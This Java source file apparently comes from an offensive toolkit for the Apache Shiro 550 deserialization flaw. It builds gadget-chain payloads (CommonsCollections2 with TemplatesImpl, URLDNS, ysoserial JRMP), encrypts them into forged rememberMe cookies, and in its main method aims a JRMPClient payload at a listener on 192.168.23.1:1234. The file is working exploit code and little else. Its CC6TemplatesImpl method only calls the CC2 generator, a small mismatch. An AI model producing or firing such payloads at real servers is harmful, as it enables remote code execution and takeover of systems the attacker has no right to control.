package org.payload.shiro.shiro550;

import static org.Tools.setSerial.unserial;
import static org.payload.cc.CC2.CommonsCollections2TemplatesImpl.CommonsCollections2TemplatesImpl;
import static org.Tools.ShiroAesCBC.ShiroAesCBC;
import static org.Tools.ysoserial.ysoserial;
import static org.payload.yuansheng.urldns.URLDNS.*;

public class toRememberMe {
    public static void CC2TemplatesImpl() throws Exception {
        byte[] evilSerialByte = CommonsCollections2TemplatesImpl();
        String rememberme = ShiroAesCBC(evilSerialByte);
        System.out.printf(rememberme);
    }

    public static void CC6TemplatesImpl() throws Exception {
        byte[] evilSerialByte = CommonsCollections2TemplatesImpl();
        String rememberme = ShiroAesCBC(evilSerialByte);
        System.out.printf(rememberme);
    }
    public static void URLDNS(String testurl) throws Exception {
        byte[] evilSerialByte = urldns(testurl);
        String rememberme = ShiroAesCBC(evilSerialByte);
        System.out.printf(rememberme);
    }
    public static void JRMP(String[] args) throws Exception {
        byte[] barr = ysoserial(args);
        unserial(barr);
        String rememberme = ShiroAesCBC(barr);
        System.out.println(rememberme);
    }
    public static void main(String[] args) throws Exception {
        //CC2TemplatesImpl();
        //CC6TemplatesImpl();
        //URLDNS("xxx");
        JRMP(new String[]{"JRMPClient", "192.168.23.1:1234"});
        //JRMP(new String[]{"JRMPListener", "7852"});
    }
}
